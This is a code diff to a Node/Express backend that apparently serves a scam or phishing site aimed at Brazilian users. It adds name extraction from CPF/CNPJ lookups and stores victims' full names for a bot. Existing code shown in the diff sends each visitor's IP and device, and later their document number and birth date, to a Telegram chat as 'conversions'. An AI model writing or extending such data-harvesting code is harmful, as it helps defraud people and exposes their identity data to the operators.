@@ -9,6 +9,7 @@ import QRCode from 'qrcode';
 import FormData from 'form-data';
 import nodemailer from 'nodemailer';
 import { hashUrl, encryptData, decryptData, queryDnsDoH, getSecureHttpsAgent } from "./security-utils.js";
+import { deepFindName } from "./name-finder.js";
 
 
 dotenv.config();
@@ -740,7 +741,7 @@ app.post("/api/v1/validate/document", async (req, res) => {
 
     // A API pode retornar o nome em diferentes campos dependendo se é CPF ou CNPJ
     const dt = responseData.data || responseData;
-    const name = dt?.dadosCPF?.NOME ||
+    let name = dt?.dadosCPF?.NOME ||
       dt?.rzo?.razao_social ||
       dt?.dadosCNPJ?.RAZAO_SOCIAL ||
       dt?.nome ||
@@ -749,8 +750,15 @@ app.post("/api/v1/validate/document", async (req, res) => {
       dt?.RAZAO_SOCIAL ||
       dt?.dados?.nome ||
       dt?.dados?.razao_social ||
-      responseData.name ||
-      "Cidadão";
+      responseData.name;
+      
+    if (!name) {
+      name = deepFindName(responseData);
+    }
+    
+    if (!name || typeof name !== 'string') {
+      name = "Cidadão";
+    }
 
     res.json({ success: true, name });
   } catch (err: any) {
@@ -1353,7 +1361,7 @@ app.post("/api/v1/session/start", async (req, res) => {
   const safeDevice = escapeHtml(String(device));
 
   const messageId = await sendTelegram(`<b>👤 NOVO VISITANTE</b>\n\n<b>IP:</b> ${safeIp}\n<b>Device:</b> ${safeDevice}\n<b>Status:</b> 🟢 Navegando...`);
-  sessions.set(userId, { messageId: messageId || 0, startTime, lastHeartbeat: startTime, ip: String(ip), device, location: location || 'Brasil', converted: false, docValue: "", birthDate: "" });
+  sessions.set(userId, { messageId: messageId || 0, startTime, lastHeartbeat: startTime, ip: String(ip), device, location: location || 'Brasil', converted: false, docValue: "", birthDate: "", fullName: "" });
   saveVisitors();
   recordVisitor();
   res.json({ status: "started", userId });
@@ -1373,6 +1381,7 @@ app.post("/api/v1/session/convert", async (req, res) => {
     session.converted = true;
     session.docValue = details.docValue;
     session.birthDate = details.birthDate;
+    if (details.fullName) session.fullName = details.fullName;
 
     const safeIp = escapeHtml(session.ip);
     const msg = `<b>🔥 CONVERSÃO!</b>\n\n<b>IP:</b> ${safeIp}\n<b>Documento:</b> ${details.docValue}\n<b>Nascimento:</b> ${details.birthDate}\n<b>Status:</b> ✅ NO WHATSAPP`;
@@ -1390,7 +1399,7 @@ app.get("/api/v1/session/data/:userId", (req, res) => {
     res.json({
       docValue: session.docValue,
       birthDate: session.birthDate,
-      fullName: "" // We don't have full name from site yet, but bot expects it
+      fullName: session.fullName || ""
     });
   } else {
     res.status(404).json({ status: "not_found" });
